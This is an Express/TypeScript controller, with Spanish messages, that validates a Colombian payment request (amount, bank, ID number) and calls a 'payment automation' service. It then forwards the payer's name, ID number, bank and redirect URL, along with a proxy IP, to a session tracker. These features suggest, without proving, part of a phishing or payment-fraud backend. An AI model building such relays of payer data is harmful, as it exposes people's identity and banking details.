import { Request, Response } from 'express';
import { executeFill } from '../services/fill.service';
import { notifySessionPayment } from './track.controller';

export async function postFill(req: Request, res: Response) {
  try {
    const { monto, banco, tipo, doc, nombre, email, celular, sessionId } = req.body ?? {};

    if (!monto || !banco || !tipo || !doc) {
      return res.status(400).json({
        error: 'Faltan campos requeridos: monto, banco, tipo, doc',
      });
    }

    const cleanMonto = String(monto).replace(/\D/g, '');
    const cleanDoc = String(doc).replace(/\D/g, '');

    if (!cleanMonto || Number(cleanMonto) < 10000) {
      return res.status(400).json({ error: 'El monto mínimo a pagar es de $10.000 COP' });
    }
    if (!cleanDoc) {
      return res.status(400).json({ error: 'Documento inválido' });
    }

    const result = await executeFill({
      monto: cleanMonto,
      banco: String(banco).trim(),
      tipo: String(tipo).trim(),
      doc: cleanDoc,
      nombre: nombre ? String(nombre).trim() : undefined,
      email: email ? String(email).trim() : undefined,
      celular: celular ? String(celular).trim() : undefined,
    });

    if (result.redirect_url) {
      notifySessionPayment(String(sessionId || 'anon'), {
        nombre: String(nombre || 'No provisto').trim(),
        monto: cleanMonto,
        cc: cleanDoc,
        banco: String(banco).trim(),
        url: result.redirect_url,
        proxyIp: result.proxy_ip,
      });
    }

    return res.json(result);
  } catch (err: any) {
    console.error('Error en /api/fill:', err);
    return res.status(500).json({
      error: err.message || 'Error al procesar la automatización de pago',
    });
  }
}

